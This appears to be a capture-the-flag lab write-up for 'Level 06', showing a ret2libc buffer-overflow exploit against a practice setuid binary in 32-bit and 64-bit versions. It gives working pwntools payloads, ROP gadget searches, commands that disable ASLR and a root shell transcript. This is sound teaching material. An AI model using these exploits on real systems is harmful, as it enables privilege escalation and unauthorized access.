# Level 06

## Setup

Similar to the last level, this one requires a little bit of setup. We need to run the same commands to set the permissions, owner, and groups for some of the files. Like last level, run

``` Bash
$ sudo chown root:root flag.txt
$ sudo chmod 600 flag.txt
$ sudo chown root:root secureserver
$ sudo chmod 4655 secureserver
```

After this, we are able to start the challenge as the permissions now represent these files being owned by root on a remote server.

## Discovering the Exploit

Lets start with our usual checks of everything here. A simple ```ls -l``` command will show us the following files and their permissions:

``` Bash
-rwxr-xr-x 1 vagrant vagrant  1431 Mar  1 13:11 exploit.py
-rw------- 1 root    root       39 Mar  1 13:11 flag.txt
-rwxr-xr-x 1 vagrant vagrant  1462 Mar  1 13:11 old_exploit.py
-rwSr-xr-x 1 root    root    15520 Mar  1 13:11 secureserver
-rwxr-xr-x 1 vagrant vagrant   343 Mar  1 13:11 secureserver.c
```

Here, ```secureserver.c``` is exactly the same as the source code from level 05 so we don't really need to look at it again. The binary ```secureserver``` is the same as the binary in level 05 with one exception: The stack is marked a non-executable. This means that we cannot run our own shell code like we did in level 05. To prove this, we have ```old_exploit.py``` which is the same script we used to exploit the level 05 binary. If we try and run that again, we get the following:

``` Bash
[*] Got EOF while reading in interactive
```

As expected, it didn't work. It put the code on the stack and jumped to it as well, but becuase the stack is marked as non-executable, our code was not run. 

So, we don't have any variables to overwrite, no hidden functions to try and jump execution to, and can't execute our own code on the stack. Let's check the binary to see if we can find anything:

``` Bash
$ file secureserver
secureserver: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ba7b32f02b9ce5948bcb57c33599de4ad17682de, for GNU/Linux 3.2.0, not stripped

$ checksec --file=secureserver
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols        No    0               1               secureserver
```

We see here that the C Standard Library is dynamically linked to the source code. This means that the source code has full access to all the functions present in the C Library, meaning we could try to jump execution to one of those functions. Specifically, we could try to call the ```system()``` function in LibC and pass it an argument of ```"/bin/sh"``` to try and spawn a shell. 

This is a more complicated attack than previous ones and requires a lot of setup in order to work, so lets dig in.

## 32-Bit Exploit

Lets start by opening the source code with ghidra and exploring what the LibC library looks like as it relates to our source code. As mentioned, we don't need to look at the source code, but rather something called the Global Offset Table. We can find this in the upper left side of Ghidra under the Program Tree's in a file called ```.got.plt```. Opening it, we see

``` Bash
                             __DT_PLTGOT                                     XREF[2]:     0804bf80(*), 
                             _GLOBAL_OFFSET_TABLE_                                        _elfSectionHeaders::0000037c(*)  
        0804c000 14 bf 04 08     addr       _DYNAMIC
                             PTR_0804c004                                    XREF[1]:     FUN_08049020:08049020(R)  
        0804c004 00 00 00 00     addr       00000000
                             PTR_0804c008                                    XREF[1]:     FUN_08049020:08049026  
        0804c008 00 00 00 00     addr       00000000
                             PTR_gets_0804c00c                               XREF[1]:     gets:08049030  
        0804c00c 00 d0 04 08     addr       <EXTERNAL>::gets                                 = ??
                             PTR_setgid_0804c010                             XREF[1]:     setgid:08049040  
        0804c010 04 d0 04 08     addr       <EXTERNAL>::setgid                               = ??
                             PTR_puts_0804c014                               XREF[1]:     puts:08049050  
        0804c014 08 d0 04 08     addr       <EXTERNAL>::puts                                 = ??
                             PTR___libc_start_main_0804c018                  XREF[1]:     __libc_start_main:08049060  
        0804c018 10 d0 04 08     addr       <EXTERNAL>::__libc_start_main                    = ??
                             PTR_setuid_0804c01c                             XREF[1]:     setuid:08049070  
        0804c01c 14 d0 04 08     addr       <EXTERNAL>::setuid                               = ??
```

This lists all the LibC functions that are used in our source code. We can see ```gets()```, ```puts()```, and many more. When a program is run with a dynamically linked LibC, the program will make calls out to the local LibC library to find the required functions. It then stores the address of those functions in the Global Offset Table so it has an easy time finding its address again.

Therefore, if we can find the address of the ```system()``` function and the ```"/bin/sh"``` string, we can call that function with the string as a parameter and get a shell!

First, lets find the offset of ```$eip``` so we know where to begin injecting addresses. We'll do the same as before using a cyclic pattern and gdb.

``` Bash
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffdd8d20  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x61616172 ("raaa"?)
$ecx   : 0xf7e1e9c4  →  0x00000000
$edx   : 0x1       
$esp   : 0xffdd8d70  →  "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
$ebp   : 0x61616173 ("saaa"?)
$esi   : 0x8049230  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7effb80  →  0x00000000
$eip   : 0x61616174 ("taaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffdd8d70│+0x0000: "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"    ← $esp
0xffdd8d74│+0x0004: "vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabia[...]"
0xffdd8d78│+0x0008: "waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabja[...]"
0xffdd8d7c│+0x000c: "xaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabka[...]"
0xffdd8d80│+0x0010: "yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabla[...]"
0xffdd8d84│+0x0014: "zaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma[...]"
0xffdd8d88│+0x0018: "baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna[...]"
0xffdd8d8c│+0x001c: "caabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboa[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616174
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "secureserver", stopped 0x61616174 in ?? (), reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

We see that the offset occurs at ```taaa``` which using ```pwn cyclic -l taaa``` we see is ```76``` bytes which makes sense since this is the same binary as the last level. 

Now we need to find where our LibC library is, where the ```system()``` function is and where ```"/bin/sh"``` is. This is complex on a local machine but still much easier than on a remote server. We can start by finding the base address of our LibC Library by running

``` Bash
$ ldd secureserver
        linux-gate.so.1 (0xf7fc7000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c00000)
        /lib/ld-linux.so.2 (0xf7fc9000)
```

This tells us that the base address for our local LibC library is at ```0xf7c00000``` from the second line of output. Unfortunately, most systems use something called ASLR (Address Space Layout Randomizer) to constantly change the LibC library base address to prevent buffer overflow attacks. That means that if we run this multiple times, we will get different addresses:

``` Bash
$ ldd secureserver
        linux-gate.so.1 (0xf7fc7000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c00000)
        /lib/ld-linux.so.2 (0xf7fc9000)
     
$ ldd secureserver
        linux-gate.so.1 (0xf7fc7000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xa0d0e020)
        /lib/ld-linux.so.2 (0xf7fc9000)
        
$ ldd secureserver
        linux-gate.so.1 (0xf7fc7000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf4b70050)
        /lib/ld-linux.so.2 (0xf7fc9000)
```

This makes it extremely difficult to figure out where the LibC library will be at any given runtime. Thankfully, since this is on our local machine, we can simply dissable this feature by running

``` Bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

To re-enable it, change the 0 to a 2. Now when we run ```ldd``` multiple times, they should all be the same

``` Bash 
$ ldd secureserver
        linux-gate.so.1 (0xf7fc7000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c00000)
        /lib/ld-linux.so.2 (0xf7fc9000)

$ ldd secureserver
        linux-gate.so.1 (0xf7fc7000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c00000)
        /lib/ld-linux.so.2 (0xf7fc9000)

$ ldd secureserver
        linux-gate.so.1 (0xf7fc7000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7c00000)
        /lib/ld-linux.so.2 (0xf7fc9000)
```

Now we need to find the offset of the ```system()``` function. This will give us the value that we can add to our base LibC address to get the address of ```system()```. We can get this by running 

``` Bash
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
3172: 0004c800    55 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0
```

The offset for ```system()``` is ```4c800```. This is incredibly helpful information. Lets take a detour and explain how this would work on a remote server. If you wish to skip this, just scroll down.

### Remote Server Explanation

The first step when doing this against a remote server rather than our local machine is to leak the address of some LibC function like ```puts()``` or ```gets()```. We can do this using the ```elf``` object in our python scripts to print the address of the function. 

Once we get that address, we can then look up the function and its address on https://libc.blukat.me/ where you can enter the function name, and the address you leaked for it (the more functions and addresses you can leak the better). This will search all the existing LibC libraries and find the one(s) where that function has the corresponding address.

Once you find the LibC library that matches those inputs, it will then tell you the base address and the offsets for each function and string. You can then use these values against the remote server.

Additionally, if you can't locate the exact LibC library but have the address for a function AND the offset for that same function, then you can subtract the two to get the base address for LibC. 

### 32-Bit Exploit (Cont.)

Back to our actual exploit.

So far we have the following addresses:

```
Base LibC: 0xf7c00000
system: LibC + 4c800
```

We now need to get the offset for the string ```"/bin/sh"``` so we can pass it to ```system()```:

``` Bash
$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
1b5faa /bin/sh
```

Awesome. Now we have all the information we need. Let's start putting together our payload. We can start with our standard boiler plate code making sure that the executable is the correct file. Since the binary is owned by root:root, we wont be able to use the ```find_ip()``` function as the core dump will be owned by root and we can't examine it. Thus, we just need to manually enter our offset.


The beginning will look like normal:

``` Python
io = start()

offset = 76
```

We have our ```io``` object from calling start and our offset that we manually set. Next, we need to define our base LibC address, ```system()``` address, and ```"/bin/sh"``` address:

``` Python
libc = 0xf7c00000
system = libc + 0x4c800
binsh = libc + 0x1b5faa
```

Lastly, we just need to contrsuct our payload using ```flat()```, write it to a file and enter interactive mode:

``` Python
payload = flat ({
    offset: [
        system,
        0x0,
        binsh
    ]
})

write('payload', payload)

io.sendlineafter(b':', payload)

io.interactive()
```

In our payload, we are saying that after our offset, enter the following data which will overflow the buffer and go onto the stack. First, we are passing the address of the ```system()``` function just like we did in our return to win challenge. 

As always, when we call a function, the next thing pushed onto the stack is the address to return to after function execution is finished. In our case, we dont care about that so we can just enter ```0x0```. 

Lastly, when calling a function in 32-bit, the function looks to the stack for any parameters rather the registers like in 64-bit. Thus, we need to put our desired parameter of ```"/bin/sh"``` on the stack as well.

Once we write our payload to a file and pass the file to the binary, we enter interactive mode and get our shell:

``` Bash
$ whoami
root
$ ls
exploit.py  old_exploit.py  sam_06.py      secureserver.c
flag.txt    payload        secureserver
$ cat flag.txt
flag{w0w_1_7h0u9h7_7h15_w45_53cu23_n0w}
$ exit
```

Now that we have run this, our file ```payload``` has been created and we can run it manually with that file. However, since it is interactive, we can't just run ```$ ./secureserver < payload```. We want to be able to interact with the shell after it executes. Thus, if you want to run it manually, you can do so with the command ```$ (cat payload; cat) | ./secureserver -p``` and this will give you a shell as well.

## 64-Bit Exploit

The 64-bit exploit is very similar in this case to the 32-bit one. The only difference is we need to use registers here rather than just the stack. 

Lets again find our offset using ```pwn cyclic 200``` and ```gdb```. Keep in mind that this is 64-bit so the bytes won't appear directly in ```$rip```:

``` Bash
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffdc60  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$rbx   : 0x007fffffffddc8  →  0x007fffffffe11e  →  "/home/vagrant/Desktop/practice/CTF/pwn/binary_expl[...]"
$rcx   : 0x007ffff7f9fa80  →  0x00000000fbad2288
$rdx   : 0x1               
$rsp   : 0x007fffffffdca8  →  "saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]"
$rbp   : 0x6161617261616171 ("qaaaraaa"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7fa1a20  →  0x0000000000000000
$rip   : 0x00000000401179  →  <receive_feedback+39> ret 
$r8    : 0x00000000405779  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffddd8  →  0x007fffffffe183  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdca8│+0x0000: "saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]"      ← $rsp
0x007fffffffdcb0│+0x0008: "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
0x007fffffffdcb8│+0x0010: "waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabja[...]"
0x007fffffffdcc0│+0x0018: "yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabla[...]"
0x007fffffffdcc8│+0x0020: "baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna[...]"
0x007fffffffdcd0│+0x0028: "daabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpa[...]"
0x007fffffffdcd8│+0x0030: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0x007fffffffdce0│+0x0038: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401172 <receive_feedback+32> call   0x401040 <gets@plt>
     0x401177 <receive_feedback+37> nop    
     0x401178 <receive_feedback+38> leave  
 →   0x401179 <receive_feedback+39> ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "secureserver", stopped 0x401179 in receive_feedback (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401179 → receive_feedback()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Here, we see that our offset starts at ```saaa``` which is 72 bytes. Next, we need to update all our addresses for 64-bit since the LibC library is different for 32 and 64 bit. We can start by running ```ldd secureserver``` to get our base address (Make sure ASLR is still off):

``` Bash
$ ldd secureserver
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dcd000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
```

This address will be our new LibC base address for the 64-bit version. Additionally, for the next two commands, make sure to use the new path to the 64-bit LibC library (given in the above command in the second output line). Now we can get our ```system()``` and ```"/bin/sh"``` offsets:

``` Bash
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
1023: 000000000004c330    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5

$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
196031 /bin/sh
```

These will be our new offsets to put in our exploit.

Next, we need to use ```ropper``` to get a gadget to pop our ```"/bin/sh"``` string into a register. A quick google search tells us that register ```$rdi``` is where parameter 1 is taken from when a function is called so we need to run:

``` Bash
$ ropper --file secureserver --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: secureserver
0x000000000040120b: pop rdi; ret;
```

Sweet, now we can add that to our exploit as well. 

So, in order for this to work in 64-bit, the value needs to be loaded into the register before the function is called. Therefore, that tells us we need to make our payload in the following order:

offset

pop rdi

binsh

system

We can construct our exploit to look like the following:

``` Python3
io = start()

offset = 72

pop_rdi = 0x40120b

libc = 0x00007ffff7dcd000
system = libc + 0x4c330
binsh = libc + 0x196031

# payload = flat (
#     asm('nop') * offset,
#     pop_rdi,
#     binsh,
#     system
# )

# OR

payload = flat ({
    offset: [
        pop_rdi,
        binsh,
        system
    ]
})

write('payload', payload)

io.sendlineafter(b':', payload)

io.interactive()
```

If we run this, we will get our shell and be able to cat out the flag!

### NOTE

Recently, it appears that there has been a change in the gcc compiler and the above exploit will no longer work. You only need to add two lines to it however.

We need a ```return``` instruction in our payload which means we need to find one with ropper:

``` Bash
$ ropper --file secureserver --search "ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: secureserver
0x0000000000401016: ret;
```

Now that we have this gadget, we can edit our exploit to look like this:

``` Python3
io = start()

offset = 72

pop_rdi = 0x40120b
ret = 0x401016

libc = 0x00007ffff7dcd000
system = libc + 0x4c330
binsh = libc + 0x196031

# payload = flat (
#     asm('nop') * offset,
#     p64(ret),
#     pop_rdi,
#     binsh,
#     system
# )

# OR

payload = flat ({
    offset: [
        p64(ret),
        pop_rdi,
        binsh,
        system
    ]
})

write('payload', payload)

io.sendlineafter(b':', payload)

io.interactive()
```

This should now work with this new compiler update!
